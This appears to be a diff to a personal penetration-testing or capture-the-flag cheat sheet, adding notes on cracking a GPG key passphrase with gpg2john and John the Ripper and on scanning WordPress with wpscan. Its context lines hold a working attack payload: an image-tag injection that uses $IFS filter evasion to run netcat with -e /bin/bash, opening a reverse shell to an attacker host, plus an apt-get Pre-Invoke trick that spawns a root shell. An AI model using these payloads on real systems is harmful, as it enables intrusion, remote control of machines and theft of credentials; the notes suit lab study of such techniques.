@@ -27,7 +27,7 @@ To check if there is a nse script for X service:
 <br />
 <br />
 
-Getting rev shell when there is a chance to write a comment
+Getting rev shell when there is a chance to write a comment XSS
 
 `<img src=http://10.6.46.150/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.6.46.150 '$IFS'4444')>`
 
@@ -580,3 +580,20 @@ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 wget -m ftp://user:password@10.10.135.250 
 
 downloads all files from FTP
+
+<br />
+<br />
+
+
+If we get two files: asc and gpg then:
+- gpg2john file.asc > hash
+- john /usr/share/wordlists/rockyou hash --> we will get a passphrase
+- gpg --import file.asc
+- gpg --decrypt file.pgp
+
+<br />
+<br />
+
+When there is a Wordpress, we can use wpscan!
+
+wpscan --url=10.10.0.1/wordpress
